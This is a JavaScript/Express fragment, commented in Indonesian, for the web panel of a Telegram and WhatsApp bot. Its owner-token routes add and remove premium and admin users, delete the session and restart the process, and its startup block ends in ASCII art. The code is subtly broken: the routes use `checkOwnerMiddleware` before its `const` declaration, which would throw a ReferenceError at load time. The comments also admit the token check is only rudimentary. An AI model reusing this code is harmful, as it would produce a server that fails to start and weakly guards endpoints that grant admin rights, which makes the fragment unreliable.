app.post('/api/addprem', checkOwnerMiddleware, (req, res) => {
    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, message: 'ID Pengguna wajib diisi.' });
    }
    if (premiumUsers.includes(userId)) {
        return res.json({ success: false, message: `Pengguna ${userId} sudah memiliki status premium.` });
    }
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
    res.json({ success: true, message: `Pengguna ${userId} sekarang memiliki akses premium!` });
});

// Rute untuk delprem
app.post('/api/delprem', checkOwnerMiddleware, (req, res) => {
    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, message: 'ID Pengguna wajib diisi.' });
    }
    if (!premiumUsers.includes(userId)) {
        return res.json({ success: false, message: `Pengguna ${userId} tidak ada dalam daftar premium.` });
    }
    premiumUsers = premiumUsers.filter((id) => id !== userId);
    saveJSON(premiumFile, premiumUsers);
    res.json({ success: true, message: `Pengguna ${userId} telah dihapus dari daftar premium.` });
});

// Rute untuk addadmin
app.post('/api/addadmin', checkOwnerMiddleware, (req, res) => {
    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, message: 'ID Pengguna wajib diisi.' });
    }
    if (adminUsers.includes(userId)) {
        return res.json({ success: false, message: `Pengguna ${userId} sudah memiliki status Admin.` });
    }
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
    res.json({ success: true, message: `Pengguna ${userId} sekarang memiliki akses Admin!` });
});

// Rute untuk deladmin
app.post('/api/deladmin', checkOwnerMiddleware, (req, res) => {
    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, message: 'ID Pengguna wajib diisi.' });
    }
    if (!adminUsers.includes(userId)) {
        return res.json({ success: false, message: `Pengguna ${userId} tidak ada dalam daftar Admin.` });
    }
    adminUsers = adminUsers.filter((id) => id !== userId);
    saveJSON(adminFile, adminUsers);
    res.json({ success: true, message: `Pengguna ${userId} telah dihapus dari daftar Admin.` });
});

// Rute untuk delsesi
app.post('/api/delsesi', checkOwnerMiddleware, (req, res) => {
    const success = deleteSession();
    if (success) {
        res.json({ success: true, message: "Session berhasil dihapus. Harap restart panel Anda." });
    } else {
        res.json({ success: false, message: "Tidak ada session yang tersimpan saat ini." });
    }
});

// Rute untuk restart
app.post('/api/restart', checkOwnerMiddleware, (req, res) => {
    res.json({ success: true, message: "Bot sedang di-restart..." });
    setTimeout(() => {
        process.exit(0);
    }, 1000);
});

// Middleware otentikasi sederhana untuk owner di API (SANGAT DASAR!)
// Di lingkungan produksi, Anda harus memiliki sistem otentikasi JWT/sesi yang lebih kuat.
// Di sini, kita akan gunakan token sederhana di header Authorization
const checkOwnerMiddleware = (req, res, next) => {
    const ownerToken = req.headers['authorization'];
    if (!ownerToken || !config.OWNER_TOKEN || ownerToken !== `Bearer ${config.OWNER_TOKEN}`) {
        return res.status(403).json({ success: false, message: 'Akses ditolak. Token owner tidak valid.' });
    }
    next();
};

// ... (Bagian bot.start, bot.command, bot.action yang sudah ada)

// Jalankan server Express setelah bot Telegraf diluncurkan
// Pindahkan baris `bot.launch()` dan `startSesi()` ke bagian ini
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    await startSesi(); // Tunggu koneksi WA terbentuk
    console.log("Sukses connected");
    bot.launch(); // Luncurkan bot Telegraf

    // Jalankan server Express
    app.listen(WEB_PANEL_PORT, () => {
        console.log(`Web Panel berjalan di http://localhost:${WEB_PANEL_PORT}`);
        console.log(chalk.bold.white(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠐⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀
`));
    });
})();